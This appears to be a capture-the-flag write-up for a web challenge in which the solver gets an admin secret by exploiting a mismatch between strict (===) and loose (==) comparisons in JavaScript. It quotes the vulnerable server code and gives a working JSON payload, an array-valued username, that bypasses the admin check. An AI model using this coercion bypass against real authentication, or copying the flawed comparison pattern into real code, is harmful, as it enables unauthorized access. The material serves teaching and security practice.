# Admins Secret

Identify as an admin and get the flag!

https://chal52-zsftd.vercel.app/secret

# Solution

The goal is to bypass the first comparison but trigger the second comparison using the username or role of "admin".

```js
// This is the first comparison
if (user.role === "admin" || user.username === "admin") {
	if (user.secret === process.env.ADMIN_KEY) {
		return res.send(`Welcome, true admin. Here's your flag: ${process.env.FLAG}`);
	} else {
		return res.status(403).send("Secret key required for admin access.");
	}
}

// ...

// This is the second comparison
thisUser = users.find((u) => u.username == user.username);
```

The issue is the first comparison is done strictly (eg using `===`) but the lookup comparison is done loosely (eg using `==`).

This means we can abuse coercion.

If we send a payload like this:

```json
{
  "user": {
    "username": ["admin"],
    "role": "user"
  }
}
```

The username of `["admin"]` will fail the strict comparison (no type coercion performed) but will be coerced into `"admin"` for the loose comparison.

```js
["admin"] === "admin"; // -> false
["admin"] == "admin"; // -> true
```

This lets us look up the admin user to get the secret. After that we can send a legit request using the acquired secret to get the flag.
